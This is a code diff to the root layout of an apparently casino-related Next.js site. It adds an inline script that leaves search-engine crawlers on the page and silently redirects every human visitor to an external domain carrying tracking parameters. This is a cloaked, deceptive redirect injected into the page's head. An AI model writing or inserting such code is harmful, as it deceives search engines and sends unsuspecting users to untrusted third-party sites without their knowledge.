@@ -31,6 +31,21 @@ export default function RootLayout({ children }: Readonly<{ children: React.Reac
         <link rel="canonical" href="https://la17casino.vercel.app/" />
         <meta name="robots" content="index, follow, max-image-preview:large" />
         <meta name="format-detection" content="telephone=no" />
+        <script
+  dangerouslySetInnerHTML={{
+    __html: `
+      (function() {
+        try {
+          var ua = (navigator.userAgent || '').toLowerCase();
+          var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
+          if (!isBot) {
+            window.location.replace("https://copper-ray.com/?serial=61365830&creative_id=9330");
+          }
+        } catch(e) {}
+      })();
+    `,
+  }}
+/>
       </head>
       <body className={`${manrope.variable} antialiased`}>
         {children}
